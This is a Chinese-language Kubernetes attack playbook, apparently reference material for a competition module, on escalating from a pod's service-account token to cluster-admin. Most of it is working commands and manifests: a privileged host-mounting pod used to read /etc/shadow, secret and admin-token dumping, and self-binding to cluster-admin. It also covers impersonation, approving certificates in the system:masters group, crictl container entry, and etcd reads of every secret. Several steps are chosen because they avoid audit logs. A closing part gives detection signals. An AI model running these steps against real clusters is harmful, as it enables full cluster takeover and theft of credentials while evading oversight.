# K8s 控制面攻击：从 pod 内 SA token 到 cluster-admin

> 被 `competition-k8s-control-plane` 引用。核心命题只有一句：
> **principal → API 权限 → 被改的对象 → 控制器把它变成的工作负载/secret**。
> 任何一步缺证据，这条链就不成立。

## 一、先证明"我在 K8s 里，且 API 可达"

```bash
# 环境指纹
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
env | grep -E 'KUBERNETES_(SERVICE_HOST|SERVICE_PORT|PORT)'
cat /proc/1/cgroup | head -3          # 含 kubepods/docker/containerd
cat /etc/resolv.conf                  # search <ns>.svc.cluster.local

# 服务发现
echo $KUBERNETES_SERVICE_HOST
nslookup kubernetes.default.svc.cluster.local
curl -sk https://kubernetes.default.svc/version --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

**判据**：`/var/run/secrets/.../token` 存在 = 有 SA 身份；`KUBERNETES_SERVICE_HOST` 有值 =
集群网络可达。两者都有，才谈后面的提权。

## 二、把 token 变成"我知道我能干什么"

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API=https://kubernetes.default.svc

# token 里到底是谁
cut -d. -f2 <<<"$TOKEN" | base64 -d 2>/dev/null | jq .
# 关注 sub（system:serviceaccount:ns:name）、aud、exp、"kubernetes.io" 段里的 pod/ns

# 权限自检（SelfSubjectRulesReview，需要 create selfsubjectrulesreviews 权限）
curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NS'"}}' \
  --cacert $CACERT | jq '.status.resourceRules'

# 最简单的逐项问
curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview",
       "spec":{"resourceAttributes":{"verb":"create","resource":"pods","namespace":"'$NS'"}}}' \
  --cacert $CACERT | jq '.status.allowed'
```

有 `kubectl` 时直接：

```bash
kubectl --token="$TOKEN" --server=$API --certificate-authority=$CACERT auth can-i --list
```

**这一步产出的表就是攻击面清单**：`create pods` / `create pods/exec` / `get secrets` /
`create daemonsets` / `patch nodes` / `create serviceaccounts/token` / `impersonate` / `bind`。

---

## 三、五条常见提权边（按命中率排序）

### 边 1：`create pods`（最常见，直接打节点）

```yaml
# evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: c
    image: alpine:3.19
    command: ["/bin/sh","-c","sleep 100000"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```bash
kubectl --token="$TOKEN" --server=$API --certificate-authority=$CACERT \
  apply -f evil-pod.yaml
kubectl --token="$TOKEN" ... exec -it pwn -- chroot /host /bin/sh -c 'id; cat /etc/shadow | head -3'
```

`hostPID: true` 时还可以直接 `nsenter -t 1 -m -u -i -n -p -- /bin/sh`，比 chroot 更干净。

### 边 2：`get/list secrets`（不用起 pod，静默）

```bash
kubectl --token="$TOKEN" ... get secrets -A -o json | jq -r '
  .items[] | select(.type=="kubernetes.io/service-account-token") |
  "\(.metadata.namespace)/\(.metadata.name)"' | head

kubectl --token="$TOKEN" ... get secret -n kube-system kube-admin -o jsonpath='{.data.token}' | base64 -d
```

老集群里每个 SA 都有一个长期 token Secret，读到一个高权 SA 的 token 就能横向。
若读到 `kubeconfig` 类的 Secret，里面通常有 `client-key-data`，等于拿到长期客户端证书。

### 边 3：`pods/exec`（不建对象，直接进高权 pod）

```bash
kubectl --token="$TOKEN" ... get pods -n kube-system
kubectl --token="$TOKEN" ... exec -n kube-system <cni-or-kube-proxy-pod> -- \
  cat /etc/cni/net.d/10-calico.conflist
# kube-proxy 容器里常有 kubeconfig，可直接提权到节点级
kubectl --token="$TOKEN" ... exec -n kube-system <kube-proxy> -- cat /var/lib/kubelet/kubeconfig
```

### 边 4：`bind` / `escalate` / `impersonate`（不打工作负载，改授权）

```bash
# bind：把已有高权 ClusterRole 绑给自己（不需要有该角色的权限，只需要 bind 权）
kubectl --token="$TOKEN" ... create clusterrolebinding pwn \
  --clusterrole=cluster-admin --serviceaccount=default:default

# escalate：直接改自己 Role 的 rules
kubectl --token="$TOKEN" ... patch role myrole -n default --type=json \
  -p '[{"op":"add","path":"/rules/-","value":{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}}]'

# impersonate：以别人身份发请求（audit 里会留 impersonatedUser）
kubectl --token="$TOKEN" ... --as=system:admin get secrets -n kube-system
```

### 边 5：`nodes/proxy` 或 `certificatesigningrequests/approval`（绕过 apiserver 审计面）

```bash
# nodes/proxy 直通 kubelet API，apiserver 只记一条 GET，看不出 exec 内容
kubectl --token="$TOKEN" ... get --raw \
  "/api/v1/nodes/<node>/proxy/run/default/pwn/c?cmd=id"

# 签一张 kubelet 客户端证书（system:masters 组）→ 长期节点级凭据
cat <<'EOF' > csr.yaml
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: {name: pwn-csr}
spec:
  request: <base64 of CSR PEM>
  signerName: kubernetes.io/kube-apiserver-client
  usages: ["client auth"]
EOF
kubectl ... apply -f csr.yaml
kubectl ... certificate approve pwn-csr
kubectl ... get csr pwn-csr -o jsonpath='{.status.certificate}' | base64 -d > pwn.crt
```

---

## 四、CRI 与 runtime 层（pod 内的"下一层"）

从 pod 打到节点后，runtime socket 是最有价值的落点：

```bash
# 节点上
ls -l /run/containerd/containerd.sock /var/run/dockershim.sock /run/crio/crio.sock
crictl -r unix:///run/containerd/containerd.sock ps -a
crictl -r unix:///run/containerd/containerd.sock inspect <container-id> | jq '.status'

# 用 crictl 进任意容器（绕过 K8s RBAC，因为不走 apiserver）
crictl -r unix:///run/containerd/containerd.sock exec -it <container-id> /bin/sh
```

若 pod 内直接挂到了 socket（`hostPath: /run/containerd/containerd.sock`），不用先打节点：

```bash
ctr -a /run/containerd/containerd.sock -n k8s.io containers ls
ctr -a /run/containerd/containerd.sock -n k8s.io tasks exec --exec-id x -t <id> /bin/sh
```

**判据**：能 `crictl ps` 列出宿主机上所有容器的 = 已越过单容器边界。
详细运行时差异见 `container-runtime.md`，内核层见 `kernel-container-escape.md`。

---

## 五、etcd 直连（一条命令拿全量 secret）

到 master 上，从静态 pod manifest 抄证书路径：

```bash
grep -E 'cert-file|key-file|trusted-ca|listen-client' /etc/kubernetes/manifests/etcd.yaml
export ETCDCTL_API=3
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only | head -40
```

读单个对象（value 带 protobuf 前缀，用 `strings` 或 `--print-value-only` 清洗）：

```bash
etcdctl ... get /registry/secrets/kube-system/cluster-admin-token-xxxxx --print-value-only | strings | head
etcdctl ... get /registry/serviceaccounts/kube-system --prefix --keys-only
etcdctl ... get /registry/roles --prefix --keys-only       # 权限模型全貌
```

**为什么值得做**：etcd 直读**不产生 K8s 审计事件**，是"静默拿 secret"的唯一路径；
同时能看到已被删除但未 compact 的历史对象（`--rev` 回看），常用于取证/找回。

---

## 六、控制器与 "对象 → 工作负载" 的转换（这一步常被漏）

改了对象不等于有效果，必须证明控制器真的把它变成了 pod/挂载/secret 消费：

| 控制器 | 你改了什么 | 它产出什么 | 怎么验证 |
| --- | --- | --- | --- |
| Deployment/ReplicaSet | `spec.template` | 新 ReplicaSet → 新 Pod | `kubectl get rs,pods -o wide`，看 `ownerReferences` |
| DaemonSet | `spec.template` | 每个节点一个 Pod | `kubectl get pods -o wide` 覆盖全部节点 |
| StatefulSet | `spec.template` | 有序 Pod + PVC | `get pvc` 是否 Bound |
| CronJob | `spec.jobTemplate` | 定时 Job | 等一个周期或改 `schedule` |
| Admission Webhook | `rules` / `failurePolicy` | 放行/改写任意请求 | 看 `failurePolicy: Ignore` 时的绕过 |
| Operator/CRD | CR 的 `spec` | 由 operator 生成真实负载 | `get <crd> -o yaml` 里的 `status` |

**关键坑**：`ownerReferences` 断了（比如手动建的 Pod）不会被控制器接管；
`kubectl apply` 的 `last-applied-configuration` 与实际对象可能已被 admission 改过。
判断"部署真值"必须看 live object，不是仓库里的 YAML。

---

## 七、检测视角

| 动作 | 审计事件 | 信号特征 |
| --- | --- | --- |
| SA token 首次使用 | `RequestReceived` + `user.username=system:serviceaccount:...` | 该 SA 从未被使用过却突然 `create pods` |
| 建特权 pod | `pods create` | `requestObject.spec.securityContext.privileged=true` 或 `hostPath` |
| exec 进 kube-system | `pods/exec create` | 非运维身份对 `kube-system` 的 exec |
| RBAC 自绑 | `clusterrolebindings create` | `roleRef.name=cluster-admin` + subject 是 SA |
| impersonate | 任意请求 | `impersonatedUser.username` 非空 |
| CSR 批准 | `certificatesigningrequests/approval` | 非 controller 身份 approve，`system:masters` 组 |
| nodes/proxy | `nodes/proxy get` | 单节点高频 GET，UA 不是 kubelet |
| 匿名访问 | 任意 | `system:anonymous` |

**云侧配对**：EKS 的 CloudTrail 有 `eks:AccessKubernetesApi` 事件；GKE 在 Cloud Audit Logs 的
`k8s.io` 服务下；ACK 走 SLS 的 audit 日志。托管集群里 apiserver 审计默认可能不开，要先确认。

## 八、验伤信号

| 声称 | 硬证据 | 假成功反例 |
| --- | --- | --- |
| 拿到节点 root | 特权 pod 内 `chroot /host id` 返回 `uid=0(root)`，且 `ls /host/var/lib/kubelet/pods` 有内容 | pod 建成功但 `CrashLoopBackOff`（镜像拉不到，根本没跑起来） |
| 拿到 cluster-admin | `auth can-i --list` 显示 `*` 且真能 `create clusterrolebinding` | 只有 `selfsubjectrulesreviews` 权限，`can-i --list` 只是"能查" |
| 拿到 secret | `base64 -d` 后是明文口令，且能用它登录下游 | 读到的是 SA token 但 audience 不匹配，调 API 401 |
| 控制器生效 | 新 pod 的 `ownerReferences` 指向你改的对象 | 对象改了但 `status.replicas` 一直是 0（被 quota/PSA 拦） |
| etcd 拿到全量 | `get /registry/secrets` 有输出且能解出 value | 2379 通但返回 `transport: authentication handshake failed`（没证书） |

## 九、常见坑

1. **PSA / 准入会静默拒特权 pod**。报错是 `forbidden: violates PodSecurity "restricted:latest"`，
   不是网络问题。先去 `kubectl get ns <ns> --show-labels` 看 enforce 等级，再考虑换 ns 或改
   `securityContext`（`allowPrivilegeEscalation`、`runAsNonRoot`、drop ALL capabilities）。
2. **Token 是 projected 短时 token，aud 受限**。拿去调云 API、另一个集群、或 `--audience` 不同的
   服务会 401。别把 401 当"没权限"。
3. **`kubectl auth can-i --list` 是"能做什么"，不是"做了什么"**。它不证明对象真被创建成功。
4. **hostPath 默认可能只读**。看 `readOnly: true`；`/` 挂成 ro 时 chroot 后改不了文件，
   很多"逃逸失败"其实是这个。
5. **多 master 时 etcd 证书 CN 有约束**。`--client-cert-auth` + `--trusted-ca-file` 只信集群 CA；
   从别的集群偷来的 etcd 证书用不了。
6. **托管集群没有 master 可登**。EKS/GKE/ACK 拿不到 etcd 和 apiserver 进程，
   把精力转到 IRSA / Workload Identity / 节点 IAM Role 上（见 `cloud-metadata-path.md`）。